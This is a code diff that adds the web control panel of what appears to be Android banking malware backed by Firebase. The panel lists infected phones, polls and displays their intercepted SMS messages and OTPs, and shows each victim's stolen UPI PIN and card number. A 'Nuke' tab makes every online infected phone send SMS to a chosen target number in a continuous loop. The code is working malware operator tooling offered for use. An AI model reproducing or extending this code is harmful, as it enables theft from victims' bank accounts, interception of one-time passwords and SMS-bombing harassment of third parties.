+            <div style="display:flex;align-items:center;gap:10px"><div class="msg-dn">&#128203; All Messages</div><div class="msg-cnt" id="amCnt">&mdash;</div></div>
+            <div style="display:flex;align-items:center;gap:8px"><button class="mbtn" onclick="trigAM(true)">&#8635; Refresh All</button><div class="live-b"><div class="ld"></div> Live</div></div>
+          </div>
+          <div id="apWrap" style="display:none"><div class="ap-txt" id="apTxt">Loading...</div><div class="ap-bar"><div class="ap-fill" id="apFill" style="width:0%"></div></div></div>
+          <div class="msg-bar">
+            <div class="sbox"><span style="color:var(--dim)">&#9900;</span><input id="amSearch" placeholder="Search message, sender, device, note..." oninput="filterAndRender()"/></div>
+            <button class="mfb ma" id="amf-all" onclick="setAMF('all')">All</button>
+            <button class="mfb" id="amf-incoming" onclick="setAMF('incoming')">In</button>
+            <button class="mfb" id="amf-outgoing" onclick="setAMF('outgoing')">Out</button>
+          </div>
+          <div id="amWrap" style="overflow-y:auto;height:calc(100vh - 290px);">
+            <div class="am-scroll" id="amList"></div>
+            <div id="amSentinel" style="height:40px;display:flex;align-items:center;justify-content:center;color:var(--dim);font-size:12px;"></div>
+          </div>
+        </div>
+
+        <!-- NUKE TAB -->
+        <div class="pane" id="pane-nuke">
+          <div class="nuke-card">
+            <div style="display:flex;align-items:center;gap:14px;margin-bottom:22px">
+              <div style="font-size:44px;animation:float 2s ease-in-out infinite">&#128163;</div>
+              <div style="flex:1">
+                <div style="font-size:22px;font-weight:900;color:var(--rose);letter-spacing:-.3px">Nuke</div>
+                <div style="font-size:12px;color:var(--sub);margin-top:3px">Fires from ALL online devices simultaneously &mdash; loops until stopped</div>
+              </div>
+              <div id="nukeLiveBadge" style="display:none;align-items:center;gap:6px;background:rgba(255,107,107,.12);border:1px solid rgba(255,107,107,.3);padding:6px 14px;border-radius:20px;font-size:11px;font-weight:700;color:var(--rose)">
+                <span style="width:8px;height:8px;border-radius:50%;background:var(--rose);animation:pulse 1s infinite;display:inline-block"></span>
+                NUKING
+              </div>
+            </div>
+
+            <label class="fl">Target Number</label>
+            <input id="nukeTarget" class="nuke-inp" placeholder="+91 9876543210"/>
+
+            <label class="fl">SIM Slot</label>
+            <div style="display:flex;gap:9px;margin-bottom:14px">
+              <button id="nukeSim1Btn" class="nuke-sim-btn nuke-sim-s1" onclick="nukeSetSim(1)">SIM 1</button>
+              <button id="nukeSim2Btn" class="nuke-sim-btn nuke-sim-s2" onclick="nukeSetSim(2)">SIM 2</button>
+            </div>
+
+            <label class="fl">Message Mode</label>
+            <div style="display:flex;gap:8px;margin-bottom:12px">
+              <button id="nukeModeRandom" onclick="nukeSetMode('random')" style="flex:1;padding:10px;background:rgba(192,132,252,.18);border:1px solid rgba(192,132,252,.4);border-radius:10px;color:var(--lilac);font-family:'Exo 2',sans-serif;font-size:12px;font-weight:800;cursor:pointer">&#127922; Random OTP</button>
+              <button id="nukeModeCustom" onclick="nukeSetMode('custom')" style="flex:1;padding:10px;background:var(--bg3);border:1px solid var(--border);border-radius:10px;color:var(--sub);font-family:'Exo 2',sans-serif;font-size:12px;font-weight:700;cursor:pointer">&#9998; Custom</button>
+            </div>
+            <div id="nukeRandomPreviewBox" style="background:rgba(192,132,252,.06);border:1px solid rgba(192,132,252,.2);border-radius:10px;padding:14px;margin-bottom:12px">
+              <div style="font-size:9px;font-weight:700;letter-spacing:1.5px;text-transform:uppercase;color:var(--sub);margin-bottom:8px">Every send will look like this (regenerates each time):</div>
+              <div id="nukePreview" style="font-size:13px;color:var(--gold);font-family:'Share Tech Mono',monospace;line-height:1.6;word-break:break-word"></div>
+              <button onclick="nukeUpdatePreview()" style="margin-top:10px;padding:6px 14px;background:var(--bg3);border:1px solid var(--border);border-radius:7px;color:var(--sub);font-family:'Exo 2',sans-serif;font-size:11px;font-weight:700;cursor:pointer">&#8635; Preview another</button>
+            </div>
+            <div id="nukeCustomBox" style="display:none;margin-bottom:12px">
+              <textarea id="nukeMsg" class="nuke-area" placeholder="Type your message here..." style="margin-bottom:6px"></textarea>
+              <div style="font-size:11px;color:var(--sub);font-family:'Share Tech Mono',monospace">Preview: <span id="nukeCustomPreview" style="color:var(--gold)"></span></div>
+            </div>
+
+            <input id="nukeDelay" type="hidden" value="0"/>
+
+            <div style="background:rgba(0,212,255,.05);border:1px solid rgba(0,212,255,.1);border-radius:11px;padding:12px 16px;margin-bottom:16px;font-size:13px;color:var(--sub)">
+              <span id="nukeOnlineCnt" style="font-weight:700;color:var(--mint)">0</span> online devices will fire each round
+            </div>
+
+            <div class="nuke-stat-box" id="nukeStats">
+              <div style="display:flex;gap:20px;flex-wrap:wrap;margin-bottom:12px">
+                <div><div style="font-size:9px;font-weight:700;letter-spacing:1px;text-transform:uppercase;color:var(--dim);margin-bottom:4px">Sent</div><div id="nukeSent" style="font-size:40px;font-weight:900;color:var(--mint)">0</div></div>
+                <div><div style="font-size:9px;font-weight:700;letter-spacing:1px;text-transform:uppercase;color:var(--dim);margin-bottom:4px">Failed</div><div id="nukeFail" style="font-size:40px;font-weight:900;color:var(--rose)">0</div></div>
+                <div id="nukeDevs" style="display:none"></div>
+                <div id="nukeRounds" style="display:none"></div>
+              </div>
+              <div id="nukeLastMsg" style="font-size:11px;color:var(--sub);font-family:'Share Tech Mono',monospace;margin-bottom:10px;line-height:1.5;word-break:break-all"></div>
+              <div class="nuke-log" id="nukeLog"></div>
+            </div>
+
+            <div style="display:flex;gap:10px">
+              <button id="nukeFireBtn" class="nuke-fire-btn" onclick="nukeStart()">&#128163; Fire Nuke</button>
+              <button id="nukeStopBtn" class="nuke-stop-btn" onclick="nukeStop()" style="display:none">&#9209; Stop</button>
+            </div>
+          </div>
+        </div>
+
+      </div>
+    </div>
+  </div>
+</div>
+
+<div class="overlay" id="addModal"><div class="modal"><div class="mt">&#65291; Add Device</div><label class="fl">Device ID</label><input class="fi" id="aId" placeholder="8f7e95a20dd55c45"/><label class="fl">Name</label><input class="fi" id="aN" placeholder="SM-A055F"/><label class="fl">Phone</label><input class="fi" id="aP" placeholder="+919876543210"/><div class="mbtns"><button class="mcnc" onclick="closeM('addModal')">Cancel</button><button class="mok" onclick="addBot()">Add</button></div></div></div>
+<div class="overlay" id="updModal"><div class="modal"><div class="mt">&#9998; Update Number</div><label class="fl">Device ID</label><input class="fi" id="uId" placeholder="Paste device ID"/><label class="fl">New Phone</label><input class="fi" id="uP" placeholder="+919876543210"/><div class="mbtns"><button class="mcnc" onclick="closeM('updModal')">Cancel</button><button class="mok" onclick="updNum()">Update</button></div></div></div>
+<div class="overlay" id="confirmModal"><div class="modal"><div class="mt" id="confT">Confirm</div><p id="confM" style="color:var(--sub);font-size:13px;margin-bottom:18px;line-height:1.7"></p><div class="mbtns"><button class="mcnc" onclick="closeM('confirmModal')">Cancel</button><button class="mok danger" id="confOk">Delete</button></div></div></div>
+<div class="toast" id="toastEl"></div>
+
+<script>
+var FB_URL='',FB_KEY='';
+var allDevices=[],sfMode='all',selDev=null;
+var allMsgs=[],mfMode='all',amfMode='all',curSim=1;
+var pinV={},pinC={},noteC={};
+var mPoll=null,dPoll=null,aPoll=null;
+var curMsgDev=null,lastKeys=new Set();
+var amCache={},amFetch={};
+var amAll=[],amFilt=[];
+var amLoading=false,amLoaded=false;
+var amCount=0,amObs=null,AM=80;
+// Nuke state
+var nukeRunning=false,nukeTimer=null,nukeSim=1,nukeSent=0,nukeFail=0,nukeRounds=0,nukeMode='random';
+
+async function fbGet(p){var r=await fetch(FB_URL+'/'+p+'.json?auth='+FB_KEY,{signal:AbortSignal.timeout(12000)});if(!r.ok)throw new Error('HTTP '+r.status);return r.json();}
+async function fbSet(p,d){var r=await fetch(FB_URL+'/'+p+'.json?auth='+FB_KEY,{method:'PUT',headers:{'Content-Type':'application/json'},body:JSON.stringify(d)});if(!r.ok)throw new Error('HTTP '+r.status);return r.json();}
+async function fbDel(p){var r=await fetch(FB_URL+'/'+p+'.json?auth='+FB_KEY,{method:'DELETE'});if(!r.ok)throw new Error('HTTP '+r.status);}
+async function getPin(id){try{var d=await fbGet('clients/'+id+'/upipin');if(d==null)return null;if(typeof d==='string'&&d.trim())return d.trim();if(typeof d==='number')return String(d);return null;}catch(e){return null;}}
+
+async function connect(){
+  var url=document.getElementById('fbUrl').value.trim().replace(/\/+$/,'');
+  var key=document.getElementById('fbKey').value.trim();
+  if(!url||!key){showErr('Both fields required');return;}
+  FB_URL=url;FB_KEY=key;
+  try{
+    await fbGet('clients');
+    document.getElementById('setup').style.display='none';
+    document.getElementById('panel').classList.add('open');
+    loadDevs();startDP();
+  }catch(e){FB_URL='';FB_KEY='';showErr('Connection failed \u2014 check URL and key');}
+}
+function showErr(m){var e=document.getElementById('serr');e.textContent=m;e.style.display='block';setTimeout(function(){e.style.display='none';},4000);}
+function disconnect(){FB_URL='';FB_KEY='';allDevices=[];selDev=null;pinC={};noteC={};amCache={};amAll=[];amFilt=[];amLoaded=false;amCount=0;nukeStop();stopMP();stopDP();stopAP();killObs();document.getElementById('panel').classList.remove('open');document.getElementById('setup').style.display='flex';document.getElementById('msgNoDev').style.display='flex';document.getElementById('msgCont').style.display='none';}
+
+function startDP(){stopDP();dPoll=setInterval(async function(){if(!FB_URL)return;try{var d=await fbGet('clients');var nD=parseDevs(d);var s=function(x){return x.id+x.status+x.battery;};if(nD.map(s).join()!==allDevices.map(s).join()){allDevices=nD;renderStats();renderSB();if(selDev){var up=allDevices.find(function(x){return x.id===selDev.id;});if(up)selDev=up;}}}catch(e){}},8000);}
+function stopDP(){if(dPoll){clearInterval(dPoll);dPoll=null;}}
+function startMP(id){stopMP();curMsgDev=id;pollMsgs(id);mPoll=setInterval(function(){pollMsgs(id);},2500);}
+function stopMP(){if(mPoll){clearInterval(mPoll);mPoll=null;}curMsgDev=null;}
+function startAP(){stopAP();aPoll=setInterval(function(){if(document.getElementById('pane-allmsgs').classList.contains('active'))pollAllFresh();},15000);}
+function stopAP(){if(aPoll){clearInterval(aPoll);aPoll=null;}}
+function setupObs(){killObs();var s=document.getElementById('amSentinel');if(!s)return;amObs=new IntersectionObserver(function(e){if(e[0].isIntersecting)renderPage();},{rootMargin:'200px'});amObs.observe(s);}
+function killObs(){if(amObs){amObs.disconnect();amObs=null;}}
+
+function rebuild(){var c=[];allDevices.forEach(function(dev){var msgs=amCache[dev.id]||[];var cn=allDevices.length-allDevices.indexOf(dev);var note=noteC[dev.id]||dev.note||'';msgs.forEach(function(m){c.push(Object.assign({},m,{cn:cn,did:dev.id,dname:dev.name,dnum:dev.mobNo,dnote:note}));});});c.sort(function(a,b){if(a._ts>0&&b._ts>0)return b._ts-a._ts;return 0;});amAll=c;}
+async function pollAllFresh(){if(amLoading||!amLoaded)return;var updated=false;await Promise.allSettled(allDevices.slice(0,20).map(async function(dev){try{var data=await fbGet('messages/'+dev.id);var msgs=parseMsgs(data);var prev=amCache[dev.id]||[];if(msgs.length!==prev.length||(msgs[0]&&prev[0]&&msgs[0].key!==prev[0].key)){amCache[dev.id]=msgs;amFetch[dev.id]=Date.now();updated=true;}}catch(e){}}));if(updated){rebuild();filterAndRender();}}
+
+async function loadDevs(){document.getElementById('sbList').innerHTML='<div class="ldwrap"><div class="gold-spin"></div> Loading...</div>';try{var data=await fbGet('clients');allDevices=parseDevs(data);allDevices.forEach(function(d){if(noteC[d.id]===undefined)noteC[d.id]=d.note||'';});renderStats();renderSB();renderOV();requestIdleCallback(function(){preloadPins(allDevices);},{timeout:3000});}catch(e){document.getElementById('sbList').innerHTML='<div class="empty" style="padding:40px 20px"><div class="ei">&#9888;&#65039;</div><p>Failed to load</p></div>';}}
+function parseDT(dt){if(!dt)return 0;var s=String(dt).trim();if(/^\d{10,13}$/.test(s))return parseInt(s.length===13?s:s+'000');var m=s.match(/(\d{1,2})[\-\/\.](\d{1,2})[\-\/\.](\d{4}).*?(\d{1,2}):(\d{2})(?::(\d{2}))?\s*(am|pm)?/i);if(m){var h=+m[4],mn=+m[5],sc=+(m[6]||0),ap=(m[7]||'').toLowerCase();if(ap==='pm'&&h<12)h+=12;if(ap==='am'&&h===12)h=0;return new Date(+m[3],+m[2]-1,+m[1],h,mn,sc).getTime();}var d=new Date(s);return isNaN(d.getTime())?0:d.getTime();}
+function parseBatt(v){if(v==null)return NaN;return parseInt(String(v).replace('%','').trim());}
+function fmtPh(n){if(!n)return'\u2014';var s=String(n).replace(/\D/g,'');if(s.startsWith('91')&&s.length===12)return'+'+s;if(s.length===10)return'+91'+s;if(s.length>0)return'+'+s;return'\u2014';}
+function parseDevs(data){var devs=[];if(data&&typeof data==='object'){Object.entries(data).forEach(function(kv){var id=kv[0],d=kv[1];if(!d||typeof d!=='object')return;var sims=Array.isArray(d.sims)?d.sims:(d.sims&&typeof d.sims==='object'?Object.values(d.sims):[]);var jTs=parseDT(d.joined||d.createdAt||d.timestamp||'')||0;var mob=fmtPh(d.mobNo||(sims[0]&&(sims[0].phoneNumber||'')||''));devs.push({id:id,fbKey:id,name:d.modelName||d.model||d.deviceName||id,batteryRaw:d.battery!=null?d.battery:'\u2014',batteryNum:parseBatt(d.battery),status:!!d.status,mobNo:mob,ip:d.ip_address||'\u2014',android:d.androidV||'\u2014',storage:d.storage||'\u2014',note:d.note||'',joined:d.joined||'\u2014',jTs:jTs,sdkV:d.sdkV||'\u2014',cpuArch:d.cpu_arch||'\u2014',isRoot:!!d.isRoot,isSdCard:!!d.isSdCard,serviceProvider:d.service_provider||'',upipin:d.upipin||null,sims:sims,cardNo:d.cardNo||d.cardNumber||d.card||null});});}devs.sort(function(a,b){if(a.status!==b.status)return b.status-a.status;if(a.jTs&&b.jTs)return b.jTs-a.jTs;return a.name.localeCompare(b.name);});return devs;}
+function renderStats(){var on=allDevices.filter(function(d){return d.status;}).length,off=allDevices.length-on;var sims=allDevices.reduce(function(a,d){return a+d.sims.length;},0);var upi=allDevices.filter(function(d){return d.upipin||pinC[d.id];}).length;document.getElementById('tpTot').textContent=allDevices.length+' total';document.getElementById('tpOn').textContent=on+' online';document.getElementById('tpOff').textContent=off+' offline';animN('sv-tot',allDevices.length);animN('sv-on',on);animN('sv-off',off);animN('sv-sim',sims);[['ov-tot',allDevices.length],['ov-on',on],['ov-off',off],['ov-upi',upi]].forEach(function(x){var e=document.getElementById(x[0]);if(e)e.textContent=x[1];});}
+function animN(id,v){var el=document.getElementById(id);if(!el)return;el.style.animation='none';el.offsetHeight;el.style.animation='numPop .4s ease';el.textContent=v;}
+function dEmo(d){var n=d.name.toLowerCase();if(n.includes('samsung'))return'&#128241;';if(n.includes('iphone'))return'&#127822;';return'&#128242;';}
+function renderSB(){var q=(document.getElementById('sbSearch').value||'').toLowerCase();var list=allDevices.filter(function(d){if(sfMode==='online'&&!d.status)return false;if(sfMode==='offline'&&d.status)return false;if(sfMode==='pin'&&!d.upipin&&!pinC[d.id])return false;if(q)return(d.name+d.id+d.mobNo).toLowerCase().includes(q);return true;});var el=document.getElementById('sbList');if(!list.length){el.innerHTML='<div class="empty" style="padding:40px 20px"><div class="ei">&#128235;</div><p>No devices</p></div>';return;}var on=list.filter(function(d){return d.status;}),off=list.filter(function(d){return !d.status;});function mkI(d,isNew){var bv=d.batteryNum,bs=isNaN(bv)?'color:var(--sub)':bv>=60?'color:var(--mint);background:rgba(0,212,170,.1)':bv>=30?'color:var(--gold);background:rgba(0,212,255,.1)':'color:var(--rose);background:rgba(255,107,107,.1)';var hasPin=d.upipin||pinC[d.id],note=noteC[d.id]||d.note||'',num=d.mobNo!=='\u2014'?d.mobNo:(d.sims[0]?fmtPh(d.sims[0].phoneNumber||''):'\u2014');return'<div class="dev-item'+(selDev&&selDev.id===d.id?' sel':'')+(isNew?' is-new':'')+'" onclick="selDev2(\''+esc(d.id)+'\')">'+'<div class="dev-av">'+dEmo(d)+'<div class="av-badge" style="background:'+(d.status?'var(--mint)':'var(--dim)')+'"></div></div>'+'<div class="dev-meta"><div class="dev-n">'+esc(d.name)+(hasPin?'<span style="font-size:9px;margin-left:4px;color:var(--lilac)">&#128179;</span>':'')+'</div>'+'<div class="dev-i">'+esc(num)+'</div>'+(note?'<div class="dev-note">&#128221; '+esc(note)+'</div>':'')+'</div>'+'<div class="dev-right"><div class="dev-batt" style="'+bs+'">'+(isNaN(bv)?d.batteryRaw:bv+'%')+'</div>'+(isNew?'<div class="new-badge">NEW</div>':'')+'</div></div>';}var h='';if(on.length){h+='<div class="sec-sep on-sep">&#128994; Online ('+on.length+')</div>';h+=on.map(function(d,i){return mkI(d,i===0);}).join('');}if(off.length){h+='<div class="sec-sep">&#11035; Offline ('+off.length+')</div>';h+=off.map(function(d){return mkI(d,false);}).join('');}el.innerHTML=h;}
+function renderOV(){var tbl=document.getElementById('ovTable');if(!allDevices.length){tbl.innerHTML='<div class="empty"><div class="ei">&#128235;</div><p>No devices</p></div>';return;}function mkR(d){var bv=d.batteryNum,bc=isNaN(bv)?'var(--sub)':bv>=60?'var(--mint)':bv>=30?'var(--gold)':'var(--rose)';var cn=allDevices.length-allDevices.indexOf(d),note=noteC[d.id]||d.note||'';return'<tr onclick="selDev2(\''+esc(d.id)+'\');switchTab(\'detail\')">'+'<td style="font-family:\'Share Tech Mono\',monospace;font-size:11px;color:var(--gold);font-weight:700">#'+cn+'</td>'+'<td><span style="display:inline-flex;align-items:center;gap:5px"><span style="width:7px;height:7px;border-radius:50%;background:'+(d.status?'var(--mint)':'var(--dim)')+(d.status?';box-shadow:0 0 6px var(--mint)':'')+'">&nbsp;</span><span style="font-size:11px;color:'+(d.status?'var(--mint)':'var(--dim)')+'">'+( d.status?'Online':'Offline')+'</span></span></td>'+'<td style="font-weight:700">'+esc(d.name)+'</td>'+'<td style="font-family:\'Share Tech Mono\',monospace;font-size:11px">'+esc(d.mobNo)+'</td>'+'<td style="font-family:\'Share Tech Mono\',monospace;font-size:10px;color:var(--dim)" title="'+esc(d.id)+'">'+esc(d.id.substring(0,14))+'&hellip;</td>'+'<td style="font-size:11px;color:var(--gold)">'+(note?esc(note):'\u2014')+'</td>'+'<td style="font-weight:700;color:'+bc+'">'+(isNaN(bv)?d.batteryRaw:bv+'%')+'</td>'+'<td style="color:var(--sub)">'+d.sims.length+'</td></tr>';}tbl.innerHTML='<table><thead><tr><th>#</th><th>Status</th><th>Model</th><th>Number</th><th>Device ID</th><th>Note</th><th>Battery</th><th>SIMs</th></tr></thead><tbody id="ovTbody">'+allDevices.slice(0,50).map(mkR).join('')+'</tbody></table>';if(allDevices.length>50)requestIdleCallback(function(){var tb=document.getElementById('ovTbody');if(tb)tb.innerHTML+=allDevices.slice(50).map(mkR).join('');},{timeout:500});}
+function setSF(f){sfMode=f;['All','On','Off','Pin'].forEach(function(n){var e=document.getElementById('sf'+n);if(e)e.className='sbf';});var map={all:'sfAll',online:'sfOn',offline:'sfOff',pin:'sfPin'},cls={all:'fa',online:'fon',offline:'foff',pin:'fpin'};var el=document.getElementById(map[f]);if(el)el.className='sbf '+cls[f];renderSB();}
+function preloadPins(devs){var tl=devs.filter(function(d){return !d.upipin&&pinC[d.id]===undefined;});var i=0;function nx(){if(i>=tl.length)return;var d=tl[i++];getPin(d.id).then(function(p){pinC[d.id]=p;if(p)renderSB();}).catch(function(){pinC[d.id]=null;});setTimeout(nx,100);}nx();}
+
+function selDev2(id){selDev=allDevices.find(function(d){return d.id===id;});if(!selDev)return;renderSB();renderDet();updDD();document.getElementById('msgNoDev').style.display='none';document.getElementById('msgCont').style.display='block';document.getElementById('msgDevN').textContent=selDev.name;updSimBar();if(curMsgDev!==selDev.id){allMsgs=[];lastKeys=new Set();preloadMsgs(selDev.id);}switchTab('detail');}
+async function preloadMsgs(id){try{var data=await fbGet('messages/'+id);var msgs=parseMsgs(data);amCache[id]=msgs;amFetch[id]=Date.now();if(selDev&&selDev.id===id){allMsgs=msgs;lastKeys=new Set(msgs.map(function(m){return m.key;}));updCnt();filterMsgs(false);}startMP(id);}catch(e){document.getElementById('msgList').innerHTML='<div class="empty"><div class="ei">&#9888;&#65039;</div><p>Failed to load</p></div>';startMP(id);}}
+async function renderDet(){if(!selDev)return;var d=selDev;document.getElementById('detPH').style.display='none';var dc=document.getElementById('detCont');dc.style.display='block';var bv=d.batteryNum,bc=isNaN(bv)?'var(--sub)':bv>=60?'var(--mint)':bv>=30?'var(--gold)':'var(--rose)';var bp=isNaN(bv)?0:Math.min(100,Math.max(0,bv)),bd=isNaN(bv)?d.batteryRaw:bv+'%';var cn=allDevices.length-allDevices.indexOf(d),note=noteC[d.id]||d.note||'';var storedCard=d.cardNo?'&#128179; '+esc(d.cardNo):'';dc.innerHTML='<div class="det-hero"><div class="dh-icon">&#128241;</div>'+'<div style="flex:1;min-width:0"><div style="font-size:10px;font-weight:700;letter-spacing:1.5px;text-transform:uppercase;color:var(--gold);margin-bottom:4px">Connection #'+cn+'</div>'+'<div class="dh-name">'+esc(d.name)+'</div><div class="dh-badges">'+'<span class="badge '+(d.status?'b-on':'b-off')+'">'+(d.status?'&#9679; Online':'&#9679; Offline')+'</span>'+(d.isRoot?'<span class="badge b-gold">&#9889; Root</span>':'')+(d.isSdCard?'<span class="badge b-lime">&#128190; SD</span>':'')+(d.sims.length?'<span class="badge b-lilac">'+d.sims.length+' SIM'+(d.sims.length>1?'s':'')+'</span>':'')+(d.serviceProvider?'<span class="badge b-sky">'+esc(d.serviceProvider)+'</span>':'')+(storedCard?'<span class="badge b-gold">'+storedCard+'</span>':'')+'</div></div>'+'<div class="batt-hero"><div class="batt-num" style="color:'+bc+'">'+bd+'</div><div class="batt-label">Battery</div>'+'<div class="batt-bar"><div class="batt-fill" style="width:'+bp+'%;background:'+bc+'"></div></div></div></div>'+(d.sims.length?'<div class="sec-hdr">SIM Cards</div><div class="sim-row">'+d.sims.map(function(s,i){return'<div class="sim-card sim'+(i+1)+'"><div class="sim-n">SIM '+(i+1)+'</div><div class="sim-ph">'+esc(fmtPh(s.phoneNumber||s.phone||''))+'</div><div class="sim-ca">'+esc(s.carrierName||s.carrier||'\u2014')+'</div></div>';}).join('')+'</div>':'')+'<div class="sec-hdr">Device Info</div><div class="info-grid">'+'<div class="ic"><div class="ic-l">Phone</div><div class="ic-v phone">'+esc(d.mobNo)+'</div></div>'+'<div class="ic"><div class="ic-l">IP Address</div><div class="ic-v ip-v">'+esc(d.ip)+'</div></div>'+'<div class="ic"><div class="ic-l">Storage</div><div class="ic-v">'+esc(String(d.storage))+'</div></div>'+'<div class="ic"><div class="ic-l">Android</div><div class="ic-v">'+esc(d.android)+'</div></div>'+'<div class="ic"><div class="ic-l">SDK</div><div class="ic-v">'+esc(d.sdkV)+'</div></div>'+'<div class="ic"><div class="ic-l">CPU</div><div class="ic-v">'+esc(d.cpuArch)+'</div></div>'+'<div class="ic"><div class="ic-l">Joined</div><div class="ic-v" style="font-size:12px">'+esc(String(d.joined))+'</div></div>'+'<div class="ic"><div class="ic-l">Conn #</div><div class="ic-v" style="color:var(--gold);font-weight:800;font-size:26px">#'+cn+'</div></div>'+'<div class="note-card"><div class="note-lbl">&#128221; Device Note</div>'+'<div class="note-disp'+(note?'':' empty')+'" id="nd-'+esc(d.id)+'">'+(note?esc(note):'No note yet\u2026')+'</div>'+'<div class="note-row"><input class="note-inp" id="ni-'+esc(d.id)+'" placeholder="Add note (bal, owner\u2026)" value="'+esc(note)+'"/>'+'<button class="note-save" onclick="saveNote(\''+esc(d.id)+'\')">Save</button></div></div>'+'<div class="pin-card" id="pc-'+esc(d.id)+'"><div class="pin-icon">&#128179;</div>'+'<div class="pin-info"><div class="pin-lbl">UPI PIN</div>'+'<div class="pin-val" id="pv-'+esc(d.id)+'"><span class="pin-load">Loading\u2026</span></div>'+'<div class="pin-sub" id="ps-'+esc(d.id)+'"></div></div>'+'<button class="pin-toggle" id="pt-'+esc(d.id)+'" onclick="togPin(\''+esc(d.id)+'\')" style="display:none">Hide</button></div>'+'</div><div class="det-actions">'+'<button class="da da-m" onclick="switchTab(\'messages\')">&#128172; Messages</button>'+'<button class="da da-s" onclick="switchTab(\'sendsms\')">&#128225; Send SMS</button>'+'<button class="da da-d" onclick="confDel(\''+esc(d.id)+'\')">&#128465;</button></div>';loadPin(d.id);}
+async function saveNote(id){var inp=document.getElementById('ni-'+id);if(!inp)return;var val=inp.value.trim();try{await fbSet('clients/'+id+'/note',val||null);noteC[id]=val;var disp=document.getElementById('nd-'+id);if(disp){disp.textContent=val||'No note yet\u2026';disp.className='note-disp'+(val?'':' empty');}var dev=allDevices.find(function(d){return d.id===id;});if(dev)dev.note=val;renderSB();if(amLoaded){rebuild();filterAndRender();}toast('&#128221; Note saved!');}catch(e){toast('&#9888; Failed to save note');}}
+async function loadPin(id){var pv=document.getElementById('pv-'+id),ps=document.getElementById('ps-'+id),pt=document.getElementById('pt-'+id);if(!pv)return;var dev=allDevices.find(function(d){return d.id===id;});var raw=dev&&dev.upipin||pinC[id];if(!raw){raw=await getPin(id);pinC[id]=raw;}if(raw){var parts=String(raw).split('|'),display=parts[0].trim();pv.innerHTML='<span style="font-size:28px;letter-spacing:8px;color:var(--gold2);font-family:\'Share Tech Mono\',monospace;font-weight:700">'+esc(display)+'</span>';pinV[id]=true;if(ps&&raw)ps.textContent='Full: '+raw;if(pt)pt.style.display='';renderSB();}else{pv.innerHTML='<span style="font-size:13px;color:var(--dim);font-style:italic">Not found</span>';}}
+function togPin(id){pinV[id]=!pinV[id];var v=document.getElementById('pv-'+id),s=document.getElementById('ps-'+id),b=document.getElementById('pt-'+id);if(v)v.classList.toggle('blurred',!pinV[id]);if(s)s.style.display=pinV[id]?'block':'none';if(b)b.textContent=pinV[id]?'Hide':'Show';}
+
+// Fixed parseMsgs - handles ALL Android SMS field names including OTP short codes
+function parseMsgs(data){
+  var msgs=[];
+  if(!data)return msgs;
+  var entries=Array.isArray(data)?data.map(function(v,i){return[String(i),v];}):Object.entries(data);
+  entries.forEach(function(kv){
+    var k=kv[0],m=kv[1];
+    if(m==null)return;
+    var message='',sender='',dateTime='',type='incoming';
+    if(typeof m==='string'){message=m;sender='Unknown';}
+    else if(typeof m==='object'){
+      // All known body fields
+      message=m.message||m.body||m.messageBody||m.text||m.msg||m.content||m.sms||m.Body||m.Message||'';
+      // All known sender fields — short codes like 59029416 come via address/originatingAddress
+      sender=m.sender||m.from||m.address||m.originatingAddress||m.phoneNumber||m.phone||
+             m.number||m.source||m.originator||m.from_number||m.senderId||
+             m.senderAddress||m.remoteAddress||m.peerAddress||
+             String(m.sender_id||m.senderid||m.shortCode||m.short_code||'');
+      if(!sender||sender==='null'||sender==='undefined'||sender==='0')sender='Unknown';
+      // All known date fields
+      dateTime=m.dateTime||m.date||m.time||m.timestamp||m.createdAt||m.created_at||
+               m.receivedAt||m.sentAt||m.dateReceived||m.dateSent||m.date_time||'';
+      // Android type: 1=inbox, 2=sent
+      var rt=String(m.type||m.direction||m.msgType||m.messageType||m.smsType||'');
+      type=(rt==='2'||rt.toLowerCase().includes('out')||rt.toLowerCase().includes('sent'))?'outgoing':'incoming';
+    }
+    if(!message&&!sender)return;
+    msgs.push({key:k,message:message||'(no body)',sender:sender||'Unknown',dateTime:dateTime,type:type,_ts:parseDT(dateTime)});
+  });
+  msgs.sort(function(a,b){if(a._ts>0&&b._ts>0)return b._ts-a._ts;if(a._ts>0)return -1;if(b._ts>0)return 1;return String(b.key).localeCompare(String(a.key));});
+  return msgs;
+}
+
+async function pollMsgs(id){try{var data=await fbGet('messages/'+id);var msgs=parseMsgs(data);var hasNew=msgs.some(function(m){return !lastKeys.has(m.key);});lastKeys=new Set(msgs.map(function(m){return m.key;}));if(hasNew||allMsgs.length!==msgs.length){amCache[id]=msgs;amFetch[id]=Date.now();allMsgs=msgs;updCnt();filterMsgs(hasNew);if(hasNew)toast('&#128228; New message!');}}catch(e){}}
+function updSimBar(){if(!selDev)return;var d=selDev,s1=d.sims[0],s2=d.sims[1];function sv(id,v){var e=document.getElementById(id);if(e)e.textContent=v;}sv('ms1n',fmtPh(s1&&(s1.phoneNumber||s1.phone)||''));sv('ms2n',s2?fmtPh(s2.phoneNumber||s2.phone||''):'No SIM');sv('ms1c',s1&&(s1.carrierName||s1.carrier)||d.serviceProvider||'\u2014');sv('ms2c',s2&&(s2.carrierName||s2.carrier)||'\u2014');var cp2=document.getElementById('mcp2');if(cp2)cp2.style.opacity=s2?'1':'0.4';}
+function clip(t,btn){if(navigator.clipboard){navigator.clipboard.writeText(t).then(function(){if(btn){btn.textContent='\u2713';btn.classList.add('ok');setTimeout(function(){btn.textContent='Copy';btn.classList.remove('ok');},2000);}});}else{var ta=document.createElement('textarea');ta.value=t;document.body.appendChild(ta);ta.select();document.execCommand('copy');document.body.removeChild(ta);if(btn){btn.textContent='\u2713';btn.classList.add('ok');setTimeout(function(){btn.textContent='Copy';btn.classList.remove('ok');},2000);}}}
+function cpSim(n){if(!selDev)return;var s=selDev.sims[n-1];var raw=s&&(s.phoneNumber||s.phone)||'';if(!raw){toast('No SIM '+n);return;}clip(fmtPh(raw),document.getElementById('mcp'+n));toast('\u{1F4CB} Copied!');}
+async function refreshMsgs(){var id=curMsgDev||selDev&&selDev.id;if(!id){toast('No device');return;}var btn=document.getElementById('mrefBtn');if(btn)btn.textContent='\u21BA\u2026';lastKeys=new Set();allMsgs=[];try{var data=await fbGet('messages/'+id);allMsgs=parseMsgs(data);lastKeys=new Set(allMsgs.map(function(m){return m.key;}));updCnt();filterMsgs(false);toast('\u2713 '+allMsgs.length+' messages');}catch(e){toast('\u26A0 Refresh failed');}if(btn)btn.textContent='\u21BA Refresh';}
+function updCnt(){var el=document.getElementById('msgCnt');if(el)el.textContent=allMsgs.length+' msg'+(allMsgs.length===1?'':'s');}
